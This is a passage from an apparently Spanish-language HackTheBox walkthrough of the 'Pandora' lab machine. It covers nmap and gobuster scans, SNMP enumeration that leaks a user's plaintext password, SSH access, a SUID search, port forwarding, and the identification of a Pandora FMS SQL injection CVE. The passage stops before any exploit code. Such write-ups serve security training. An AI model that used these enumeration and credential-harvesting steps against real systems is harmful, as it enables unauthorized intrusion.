200      GET        1l      339w     6613c http://10.10.11.136/assets/images/footer/brands/uideck.svg
200      GET        1l      296w     5850c http://10.10.11.136/assets/images/brands/lineicons.svg
200      GET        1l      343w    12105c http://10.10.11.136/assets/images/footer/brands/ecommerce-html.svg
200      GET     2613l     5243w    49342c http://10.10.11.136/assets/css/ud-styles.css
200      GET        1l      447w     7311c http://10.10.11.136/assets/images/hero/brand.svg
200      GET        1l      436w     8716c http://10.10.11.136/assets/images/brands/tailwindtemplates.svg
200      GET        1l       87w     1451c http://10.10.11.136/assets/images/footer/brands/ayroui.svg
200      GET      907l     2081w    33560c http://10.10.11.136/index.html
200      GET        1l       23w   205311c http://10.10.11.136/assets/images/hero/hero-image.svg
200      GET     2210l     2818w    26978c http://10.10.11.136/assets/css/lineicons.css
200      GET        0l        0w   263054c http://10.10.11.136/assets/images/about/about-image.svg
200      GET      907l     2081w    33560c http://10.10.11.136/
200      GET        1l       14w      206c http://10.10.11.136/assets/images/team/shape-2.svg
200      GET        1l      514w     5303c http://10.10.11.136/assets/images/team/dotted-shape.svg
200      GET        1l       63w      965c http://10.10.11.136/assets/images/blog/quote-bg.svg
200      GET        1l       59w      931c http://10.10.11.136/assets/images/banner/banner-bg.svg
200      GET       72l      384w    26960c http://10.10.11.136/assets/images/blog/article-author-01.png
200      GET       22l       41w      444c http://10.10.11.136/assets/scss/_banner.scss
200      GET       20l      133w    10610c http://10.10.11.136/assets/images/blog/author-01.png
200      GET        1l      155w     1622c http://10.10.11.136/assets/images/blog/dotted-shape.svg
200      GET       80l      414w    26651c http://10.10.11.136/assets/images/blog/article-author-04.png
200      GET       58l      396w    24661c http://10.10.11.136/assets/images/blog/article-author-03.png
200      GET       64l      372w    28012c http://10.10.11.136/assets/images/blog/article-author-02.png
200      GET      225l     1315w   108072c http://10.10.11.136/assets/images/team/team-01.png
200      GET      290l     1846w   119742c http://10.10.11.136/assets/images/blog/bannder-ad.png
200      GET        8l       57w      455c http://10.10.11.136/assets/scss/_variables.scss
200      GET      228l     1302w   102185c http://10.10.11.136/assets/images/team/team-02.png
200      GET      177l     1156w    99288c http://10.10.11.136/assets/images/team/team-03.png
200      GET      319l     1954w   151043c http://10.10.11.136/assets/images/blog/blog-03.jpg
200      GET       81l      155w     1431c http://10.10.11.136/assets/scss/_faq.scss
200      GET      230l     1276w   100315c http://10.10.11.136/assets/images/team/team-04.png
200      GET      379l     2166w   162485c http://10.10.11.136/assets/images/blog/blog-01.jpg
200      GET      592l     3151w   242515c http://10.10.11.136/assets/images/blog/blog-02.jpg
200      GET     1616l    75767w   593511c http://10.10.11.136/assets/fonts/LineIcons.svg
200      GET     6061l    33168w  2270905c http://10.10.11.136/assets/images/blog/blog-details-01.jpg
</code></pre></div></div>

<ul>
  <li>Bueno nada interesante ahora vamos a buscar subdominios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster vhost <span class="nt">-u</span> http://10.10.11.136 <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">--no-error</span> <span class="nt">-t</span> 80
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:             http://10.10.11.136
<span class="o">[</span>+] Method:          GET
<span class="o">[</span>+] Threads:         80
<span class="o">[</span>+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">[</span>+] User Agent:      gobuster/3.6
<span class="o">[</span>+] Timeout:         10s
<span class="o">[</span>+] Append Domain:   <span class="nb">false</span>
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>VHOST enumeration mode
<span class="o">===============================================================</span>
Progress: 114441 / 114442 <span class="o">(</span>100.00%<span class="o">)</span>
<span class="o">===============================================================</span>
Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<ul>
  <li>Pues bueno no encontramos nada algo que podemos hacer es escanear los puertos abiertos pero por el protocolo UDP.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">--open</span> <span class="nt">-sU</span> <span class="nt">--top-ports</span> 100 <span class="nt">-T5</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">--open</span> 10.10.11.136 <span class="nt">-oG</span> udpPorts
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-19 13:19 CST
Initiating Ping Scan at 13:19
Scanning 10.10.11.136 <span class="o">[</span>4 ports]
Completed Ping Scan at 13:19, 0.13s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating UDP Scan at 13:19
Scanning 10.10.11.136 <span class="o">[</span>100 ports]
Warning: 10.10.11.136 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span><span class="nb">.</span>
Discovered open port 161/udp on 10.10.11.136
</code></pre></div></div>

<ul>
  <li>Solo tenemos 1 puerto abierto el cual corre el servicio <code class="language-plaintext highlighter-rouge">snmp</code> vamos a escanearlo para ver mas información sobre ese puerto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sUCV</span> <span class="nt">-p161</span> 10.10.11.136 <span class="nt">-oN</span> UDPtargeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-19 13:21 CST
Nmap scan report <span class="k">for </span>10.10.11.136
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

Bug <span class="k">in </span>snmp-win32-software: no string output.
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 365.41 Kb sent, 365.41 Kb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.136  Netmask: 255.255.254.0
|     MAC address: 00:50:56:b0:de:f7 <span class="o">(</span>VMware<span class="o">)</span>
|     Type: ethernetCsmacd  Speed: 4 Gbps
|_    Traffic stats: 756.20 Mb sent, 99.77 Mb received
| snmp-sysdescr: Linux pandora 5.4.0-91-generic <span class="c">#102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64</span>
|_  System <span class="nb">uptime</span>: 27m5.89s <span class="o">(</span>162589 timeticks<span class="o">)</span>
| snmp-processes:
|   1:
|     Name: systemd
|   2:
|     Name: kthreadd
|   3:
|     Name: rcu_gp
|   4:
|     Name: rcu_par_gp
|   5:
|     Name: kworker/0:0-mm_percpu_wq
|   6:
|     Name: kworker/0:0H-kblockd
|   9:
|     Name: mm_percpu_wq
|   10:
|     Name: ksoftirqd/0
|   11:
|     Name: rcu_sched
|   12:
|     Name: migration/0
|   13:
|     Name: idle_inject/0
|   14:
|     Name: cpuhp/0
|   15:
|     Name: cpuhp/1
|   16:
|     Name: idle_inject/1
|   17:
|     Name: migration/1
|   18:
|     Name: ksoftirqd/1
|   20:
|     Name: kworker/1:0H-kblockd
|   21:
|     Name: kdevtmpfs
|   22:
|     Name: netns
|   23:
|     Name: rcu_tasks_kthre
|   24:
|     Name: kauditd
|   25:
|     Name: khungtaskd
|   26:
|     Name: oom_reaper
|   27:
|     Name: writeback
|   28:
|     Name: kcompactd0
|   29:
|     Name: ksmd
|   30:
|     Name: khugepaged
|   77:
|     Name: kintegrityd
|   78:
|     Name: kblockd
|   79:
|     Name: blkcg_punt_bio
|   80:
|     Name: tpm_dev_wq
|   81:
|     Name: ata_sff
|   82:
|     Name: md
|   83:
|     Name: edac-poller
|   84:
|     Name: devfreq_wq
|   85:
|     Name: watchdogd
|   88:
|     Name: kswapd0
|   89:
|     Name: ecryptfs-kthrea
|   91:
|     Name: kthrotld
|   92:
|     Name: irq/24-pciehp
|   93:
|     Name: irq/25-pciehp
|   94:
|     Name: irq/26-pciehp
|   95:
|     Name: irq/27-pciehp
|   96:
|     Name: irq/28-pciehp
|   97:
|     Name: irq/29-pciehp
|   98:
|     Name: irq/30-pciehp
|   99:
|     Name: irq/31-pciehp
|   100:
|     Name: irq/32-pciehp
|   101:
|     Name: irq/33-pciehp
|   102:
|     Name: irq/34-pciehp
|   103:
|     Name: irq/35-pciehp
|   104:
|     Name: irq/36-pciehp
|   105:
|     Name: irq/37-pciehp
|   106:
|     Name: irq/38-pciehp
|   107:
|     Name: irq/39-pciehp
|   108:
|     Name: irq/40-pciehp
|   109:
|     Name: irq/41-pciehp
|   110:
|     Name: irq/42-pciehp
|   111:
|     Name: irq/43-pciehp
|   112:
|     Name: irq/44-pciehp
|   113:
|     Name: irq/45-pciehp
|   114:
|     Name: irq/46-pciehp
|   115:
|     Name: irq/47-pciehp
|   116:
|     Name: irq/48-pciehp
|   117:
|     Name: irq/49-pciehp
|   118:
|     Name: irq/50-pciehp
|   119:
|     Name: irq/51-pciehp
|   120:
|     Name: irq/52-pciehp
|   121:
|     Name: irq/53-pciehp
|   122:
|     Name: irq/54-pciehp
|   123:
|     Name: irq/55-pciehp
|   124:
|     Name: acpi_thermal_pm
|   125:
|     Name: scsi_eh_0
|   126:
|     Name: scsi_tmf_0
|   127:
|     Name: scsi_eh_1
|   128:
|     Name: scsi_tmf_1
|   130:
|     Name: vfio-irqfd-clea
|   131:
|     Name: ipv6_addrconf
|   141:
|     Name: kstrp
|   144:
|     Name: kworker/u5:0
|   157:
|     Name: charger_manager
|   202:
|     Name: scsi_eh_2
|   203:
|     Name: scsi_tmf_2
|   204:
|     Name: scsi_eh_3
|   205:
|     Name: scsi_tmf_3
|   206:
|     Name: mpt_poll_0
|   207:
|     Name: cryptd
|   215:
|     Name: scsi_eh_4
|   217:
|     Name: scsi_tmf_4
|   218:
|     Name: mpt/0
|   220:
|     Name: scsi_eh_5
|   224:
|     Name: scsi_tmf_5
|   225:
|     Name: scsi_eh_6
|   226:
|     Name: scsi_tmf_6
|   227:
|     Name: scsi_eh_7
|   228:
|     Name: scsi_tmf_7
|   232:
|     Name: scsi_eh_8
|   237:
|     Name: scsi_tmf_8
|   239:
|     Name: scsi_eh_9
|   240:
|     Name: scsi_tmf_9
|   241:
|     Name: scsi_eh_10
|   254:
|     Name: scsi_tmf_10
|   255:
|     Name: scsi_eh_11
|   256:
|     Name: scsi_tmf_11
|   257:
|     Name: scsi_eh_12
|   259:
|     Name: kworker/1:3-events
|   260:
|     Name: scsi_tmf_12
|   261:
|     Name: scsi_eh_13
|   262:
|     Name: irq/16-vmwgfx
|   263:
|     Name: scsi_tmf_13
|   264:
|     Name: ttm_swap
|   265:
|     Name: scsi_eh_14
|   266:
|     Name: scsi_tmf_14
|   267:
|     Name: scsi_eh_15
|   268:
|     Name: scsi_tmf_15
|   269:
|     Name: scsi_eh_16
|   270:
|     Name: scsi_tmf_16
|   271:
|     Name: scsi_eh_17
|   272:
|     Name: scsi_tmf_17
|   273:
|     Name: scsi_eh_18
|   274:
|     Name: scsi_tmf_18
|   275:
|     Name: scsi_eh_19
|   276:
|     Name: scsi_tmf_19
|   277:
|     Name: scsi_eh_20
|   278:
|     Name: scsi_tmf_20
|   279:
|     Name: scsi_eh_21
|   280:
|     Name: scsi_tmf_21
|   281:
|     Name: scsi_eh_22
|   282:
|     Name: scsi_tmf_22
|   283:
|     Name: scsi_eh_23
|   284:
|     Name: scsi_tmf_23
|   285:
|     Name: scsi_eh_24
|   286:
|     Name: scsi_tmf_24
|   287:
|     Name: scsi_eh_25
|   288:
|     Name: scsi_tmf_25
|   289:
|     Name: scsi_eh_26
|   290:
|     Name: scsi_tmf_26
|   291:
|     Name: scsi_eh_27
|   292:
|     Name: scsi_tmf_27
|   293:
|     Name: scsi_eh_28
|   294:
|     Name: scsi_tmf_28
|   295:
|     Name: scsi_eh_29
|   296:
|     Name: scsi_tmf_29
|   297:
|     Name: scsi_eh_30
|   298:
|     Name: scsi_tmf_30
|   299:
|     Name: scsi_eh_31
|   300:
|     Name: scsi_tmf_31
|   324:
|     Name: kworker/u4:27-events_power_efficient
|   329:
|     Name: scsi_eh_32
|   330:
|     Name: scsi_tmf_32
|   331:
|     Name: kworker/1:1H-kblockd
|   343:
|     Name: kdmflush
|   345:
|     Name: kdmflush
|   376:
|     Name: raid5wq
|   430:
|     Name: kworker/0:1H-kblockd
|   434:
|     Name: jbd2/dm-0-8
|   435:
|     Name: ext4-rsv-conver
|   489:
|     Name: systemd-journal
|   516:
|     Name: systemd-udevd
|   518:
|     Name: systemd-network
|   660:
|     Name: kaluad
|   661:
|     Name: kmpath_rdacd
|   662:
|     Name: kmpathd
|   663:
|     Name: kmpath_handlerd
|   664:
|     Name: multipathd
|   672:
|     Name: jbd2/sda2-8
|   673:
|     Name: ext4-rsv-conver
|   685:
|     Name: systemd-resolve
|   688:
|     Name: systemd-timesyn
|   704:
|     Name: VGAuthService
|   712:
|     Name: vmtoolsd
|   758:
|     Name: accounts-daemon
|   759:
|     Name: dbus-daemon
|   764:
|     Name: irqbalance
|   765:
|     Name: networkd-dispat
|   766:
|     Name: rsyslogd
|   767:
|     Name: systemd-logind
|   772:
|     Name: udisksd
|   790:
|     Name: cron
|   807:
|     Name: cron
|   829:
|     Name: atd
|   840:
|     Name: sh
|   845:
|     Name: snmpd
|   850:
|     Name: sshd
|   878:
|     Name: agetty
|   879:
|     Name: kworker/0:6-rcu_gp
|   928:
|     Name: apache2
|   960:
|     Name: mysqld
|   967:
|     Name: polkitd
|   1102:
|     Name: host_check
|   2831:
|     Name: apache2
|   3138:
|     Name: kworker/1:0-events
|   3287:
|     Name: kworker/u4:0-events_power_efficient
|   3429:
|     Name: apache2
|   3432:
|     Name: apache2
|   3479:
|     Name: apache2
|   3514:
|     Name: apache2
|   3524:
|     Name: apache2
|   3552:
|     Name: apache2
|   3579:
|     Name: apache2
|   5024:
|     Name: apache2
|   5066:
|_    Name: apache2
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 48fa95537765c36000000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 27m06s
| snmp-netstat:
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:60648   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          <span class="k">*</span>:<span class="k">*</span>
|_  UDP  127.0.0.53:53        <span class="k">*</span>:<span class="k">*</span>
Service Info: Host: pandora
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos a enumerar este servicio <a href="https://www.paessler.com/es/it-explained/snmp">https://www.paessler.com/es/it-explained/snmp</a> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</a>.</p>
  </li>
  <li>
    <p>Vamos a usar la herramienta <code class="language-plaintext highlighter-rouge">snmpwalk</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp#enumerating-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp#enumerating-snmp</a>.</p>
  </li>
  <li>
    <p>Para enumerar necesitamos saber una <code class="language-plaintext highlighter-rouge">community string</code> valida la mas conocida es <code class="language-plaintext highlighter-rouge">Public</code> podemos probar enumerando con ese nombre.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap snmpwalk <span class="nt">-v2c</span> <span class="nt">-c</span> public 10.10.11.136
iso.3.6.1.2.1.1.1.0 <span class="o">=</span> STRING: <span class="s2">"Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"</span>
iso.3.6.1.2.1.1.2.0 <span class="o">=</span> OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 <span class="o">=</span> Timeticks: <span class="o">(</span>209683<span class="o">)</span> 0:34:56.83
iso.3.6.1.2.1.1.4.0 <span class="o">=</span> STRING: <span class="s2">"Daniel"</span>
iso.3.6.1.2.1.1.5.0 <span class="o">=</span> STRING: <span class="s2">"pandora"</span>
iso.3.6.1.2.1.1.6.0 <span class="o">=</span> STRING: <span class="s2">"Mississippi"</span>
iso.3.6.1.2.1.1.7.0 <span class="o">=</span> INTEGER: 72
iso.3.6.1.2.1.1.8.0 <span class="o">=</span> Timeticks: <span class="o">(</span>10<span class="o">)</span> 0:00:00.10
</code></pre></div></div>

<ul>
  <li>
    <p>Tenemos el nombre de un usuario el cual es Daniel.</p>
  </li>
  <li>
    <p>Existe otra herramienta la cual funciona mucho mejor se llama <code class="language-plaintext highlighter-rouge">snmpbulkwalk</code>.</p>
  </li>
  <li>
    <p>Podemos hacer lo mismo pero exportaremos todo a un <code class="language-plaintext highlighter-rouge">.txt</code> para simplemente <code class="language-plaintext highlighter-rouge">grepear</code> por Daniel para ver si vemos mas información.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content snmpbulkwalk <span class="nt">-c</span> public <span class="nt">-v2c</span> 10.10.11.136 <span class="o">&gt;</span> snmp_enum.txt
➜  content <span class="nb">wc</span> <span class="nt">-l</span> snmp_enum.txt
6989 snmp_enum.txt
</code></pre></div></div>

<ul>
  <li>Vemos la contraseña del usuario Daniel.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>snmp_enum.txt | <span class="nb">grep</span> <span class="s2">"Daniel"</span> <span class="nt">-i</span>
iso.3.6.1.2.1.1.4.0 <span class="o">=</span> STRING: <span class="s2">"Daniel"</span>
iso.3.6.1.2.1.25.4.2.1.5.840 <span class="o">=</span> STRING: <span class="s2">"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"</span>
iso.3.6.1.2.1.25.4.2.1.5.1102 <span class="o">=</span> STRING: <span class="s2">"-u daniel -p HotelBabylon23"</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Daniel:HotelBabylon23</code>.</li>
</ul>

<h2 id="shell-as-daniel">Shell as daniel</h2>

<ul>
  <li>Como el puerto 22 que corresponde a SSH esta abierto podemos conectarnos con las credenciales que encontramos enumerando por ese protocolo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ssh daniel@10.10.11.136
The authenticity of host <span class="s1">'10.10.11.136 (10.10.11.136)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.136<span class="s1">' (ED25519) to the list of known hosts.
daniel@10.10.11.136'</span>s password:
Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-91-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Wed 19 Jun 19:35:55 UTC 2024

  System load:           0.0
  Usage of /:            63.5% of 4.87GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             229
  Users logged <span class="k">in</span>:       0
  IPv4 address <span class="k">for </span>eth0: 10.10.11.136
  IPv6 address <span class="k">for </span>eth0: dead:beef::250:56ff:feb0:def7

  <span class="o">=&gt;</span> /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update


The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<ul>
  <li>No tenemos ningún privilegio a nivel de <code class="language-plaintext highlighter-rouge">sudoers</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>daniel:
Sorry, user daniel may not run <span class="nb">sudo </span>on pandora.
</code></pre></div></div>

<ul>
  <li>Hay otro usuario el cual se llama <code class="language-plaintext highlighter-rouge">matt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:~<span class="nv">$ </span><span class="nb">cd</span> /home/
daniel@pandora:/home<span class="nv">$ </span><span class="nb">ls
</span>daniel  matt
daniel@pandora:/home<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>sh
root:x:0:0:root:/root:/bin/bash
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
daniel@pandora:/home<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Necesitamos convertirnos en ese usuario para poder leer la <code class="language-plaintext highlighter-rouge">user.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/home/matt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
<span class="nt">-rw-r-----</span> 1 root matt 33 Jun 19 18:56 user.txt
daniel@pandora:/home/matt<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat</span>: user.txt: Permission denied
</code></pre></div></div>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">pandora_backup</code> además de tener el <code class="language-plaintext highlighter-rouge">pkexec</code> expuesto en esta ocasión no lo vamos a explotar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/pandora_backup
./usr/bin/passwd
./usr/bin/mount
./usr/bin/su
./usr/bin/at
./usr/bin/fusermount
./usr/bin/chsh
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
</code></pre></div></div>

<ul>
  <li>El grupo asignado es matt y el propietario es root.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> ./usr/bin/pandora_backup
<span class="nt">-rwsr-x---</span> 1 root matt 16816 Dec  3  2021 ./usr/bin/pandora_backup
</code></pre></div></div>

<ul>
  <li>Tenemos que convertirnos en <code class="language-plaintext highlighter-rouge">matt</code> así que vamos ir a la ruta donde esta montana la pagina web.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/var/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 8
drwxr-xr-x 3 root root 4096 Dec  7  2021 html
drwxr-xr-x 3 matt matt 4096 Dec  7  2021 pandora
daniel@pandora:/var/www<span class="nv">$ </span><span class="nb">cd </span>pandora/
daniel@pandora:/var/www/pandora<span class="nv">$ </span>ll
total 16
drwxr-xr-x  3 matt matt 4096 Dec  7  2021 ./
drwxr-xr-x  4 root root 4096 Dec  7  2021 ../
<span class="nt">-rw-r--r--</span>  1 matt matt   63 Jun 11  2021 index.html
drwxr-xr-x 16 matt matt 4096 Dec  7  2021 pandora_console/
</code></pre></div></div>

<ul>
  <li>Vemos los archivos de configuración de Pandora <a href="https://pandorafms.com/es/">https://pandorafms.com/es/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/var/www/pandora<span class="nv">$ </span><span class="nb">cd </span>pandora_console/
daniel@pandora:/var/www/pandora/pandora_console<span class="nv">$ </span><span class="nb">ls
</span>ajax.php       COPYING               extras   index.php                         pandora_console_logrotate_suse    tests
attachment     DB_Dockerfile         fonts    install.done                      pandora_console_logrotate_ubuntu  tools
audit.log      DEBIAN                general  mobile                            pandora_console_upgrade           vendor
AUTHORS        docker_entrypoint.sh  godmode  operation                         pandoradb_data.sql                ws.php
composer.json  Dockerfile            images   pandora_console.log               pandoradb.sql
composer.lock  extensions            include  pandora_console_logrotate_centos  pandora_websocket_engine.service
</code></pre></div></div>

<ul>
  <li>La web esta usando Apache2 al ir a su ruta hay un archivo el cual se llama <code class="language-plaintext highlighter-rouge">pandora.conf</code> que contiene un subdominio y lo esta corriendo el usuario <code class="language-plaintext highlighter-rouge">matt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/etc/apache2/sites-enabled<span class="nv">$ </span><span class="nb">cat </span>pandora.conf
&lt;VirtualHost localhost:80&gt;
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  &lt;Directory /var/www/pandora&gt;
    AllowOverride All
  &lt;/Directory&gt;
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
&lt;/VirtualHost&gt;
</code></pre></div></div>

<ul>
  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para ver si vemos algo diferente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">echo</span> <span class="s2">"10.10.11.136 pandora.panda.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.136 pandora.panda.htb
</code></pre></div></div>

<ul>
  <li>Vemos lo mismo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/2.png" />
</p>

<ul>
  <li>Pero nos dice que se esta corriendo en el puerto 80 puede que externamente no lo veamos expuesto pero con esto podemos comprobar que si se esta corriendo y nos lleva ala ruta <code class="language-plaintext highlighter-rouge">/pandora_console</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@pandora:/etc/apache2/sites-enabled<span class="nv">$ </span>curl localhost
&lt;meta HTTP-EQUIV<span class="o">=</span><span class="s2">"REFRESH"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"0; url=/pandora_console/"</span><span class="o">&gt;</span>
</code></pre></div></div>

<h2 id="local-port-forwarding">Local Port Forwarding</h2>

<ul>
  <li>Vamos a hacer un <code class="language-plaintext highlighter-rouge">Local Port Forwarding</code> para que el puerto <code class="language-plaintext highlighter-rouge">80</code> de la máquina sea nuestro puerto <code class="language-plaintext highlighter-rouge">80</code> y ver lo que esta corriendo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ssh daniel@10.10.11.136 <span class="nt">-L</span> 80:127.0.0.1:80
daniel@10.10.11.136<span class="s1">'s password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 19 Jun 19:52:31 UTC 2024

  System load:           0.06
  Usage of /:            63.5% of 4.87GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb0:def7

  =&gt; /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun 19 19:35:56 2024 from 10.10.14.62
daniel@pandora:~$
</span></code></pre></div></div>

<ul>
  <li>Comprobamos que todo este bien.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content lsof <span class="nt">-i</span>:80
COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     19827 miguel    4u  IPv6  64194      0t0  TCP localhost:http <span class="o">(</span>LISTEN<span class="o">)</span>
ssh     19827 miguel    5u  IPv4  64195      0t0  TCP localhost:http <span class="o">(</span>LISTEN<span class="o">)</span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/3.png" />
</p>

<ul>
  <li>Abajo de la web tenemos la versión que esta corriendo pandora.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/4.png" />
</p>

<h2 id="cve-2021-32099-unauthenticated-sql-injection">CVE-2021-32099 Unauthenticated SQL Injection</h2>

<ul>
  <li>
    <p>Como no tenemos credenciales encontramos que esta versión es vulnerable <a href="https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/">https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/</a>.</p>
  </li>
  <li>
    <p>Esta es la ruta que nos dicen donde se aplica la SQL Injection.</p>
  </li>
</ul>

<p align="center">
